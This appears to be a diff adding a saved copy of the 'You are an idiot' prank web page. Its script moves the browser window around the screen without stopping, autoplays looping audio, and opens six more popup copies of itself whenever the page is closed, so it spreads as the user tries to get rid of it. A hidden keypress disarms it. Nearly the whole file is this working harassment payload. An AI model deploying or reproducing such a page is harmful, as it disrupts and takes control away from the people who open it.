@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<!-- saved from url=(0025)https://youareanidiot.de/ -->
+<html lang="de"><script type="text/javascript">window["_gaUserPrefs"] = { ioo : function() { return true; } }</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+     <meta name="keywords" content="You are an idiot">
+	<meta name="Description" content="You are an idiot!">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	
+
+<title>You are an idiot!</title>
+<script>
+var xOff = 5;
+var yOff = 5;
+var xPos = 400;
+var yPos = 100;
+var armed = true;	
+	
+document.addEventListener("keypress", function(event) {
+    if (event.keyCode == 50) {
+        alert("disarmed");
+		armed = false;
+    }
+    if (event.keyCode == 52) {
+        procreate();
+    }
+})
+
+function openWindow(url){
+        aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=noresizable=no,width=320,height=240,titlebar=no,alwaysRaised=yes');
+}
+
+function procreate(){
+	    if(armed){
+		openWindow('index.html');
+		openWindow('index.html');
+		openWindow('index.html');
+		openWindow('index.html');
+		openWindow('index.html');
+		openWindow('index.html');
+        alert("You are an idiot");
+		}
+		}
+function playBall() {
+	    if(armed){
+        window.focus();   
+        xPos = xPos + xOff;
+        yPos = yPos + yOff;
+        if (xPos > screen.width-175){
+        xOff = Math.ceil( 0 - 6 * Math.random()) * 5 - 10 ;
+        window.focus();
+        }
+        if (xPos < 0){
+        xOff = Math.ceil(7 * Math.random())  * 5 - 10 ;
+        }
+        if (yPos > screen.height-100){
+        yOff = Math.ceil( 0 - 6 * Math.random())  * 5 - 10 ;
+        }
+        if (yPos < 0){
+        yOff = Math.ceil( 7 * Math.random())  * 5 - 10  ;
+        }
+        window.moveTo(xPos,yPos);
+		setTimeout('playBall()',10);
+		}	
+}
+</script>
+<style type="text/css">
+        <!--
+	body {
+		background-image: url("you.gif");
+		background-size: cover;
+      	background-attachment: fixed;
+      	background-position: center center;
+	}
+        -->
+    </style>
+</head>
+<body bgcolor="#000000" onload="playBall()" onunload="procreate()" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+<audio autoplay loop>
+  <source src="you.mp3">
+</audio>
+</body></html>
